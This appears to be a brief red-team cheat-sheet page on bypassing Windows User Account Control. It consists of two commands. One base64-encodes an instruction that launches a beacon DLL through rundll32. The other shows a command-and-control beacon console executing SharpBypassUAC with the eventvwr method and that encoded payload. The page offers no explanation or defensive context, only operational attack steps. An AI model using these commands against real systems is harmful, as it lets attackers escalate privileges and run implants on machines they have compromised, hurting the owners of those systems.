# 🟢 ByPass UAC

```
echo -n 'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update' | base64
```

{% code overflow="wrap" %}
```
beacon> execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ==
```
{% endcode %}
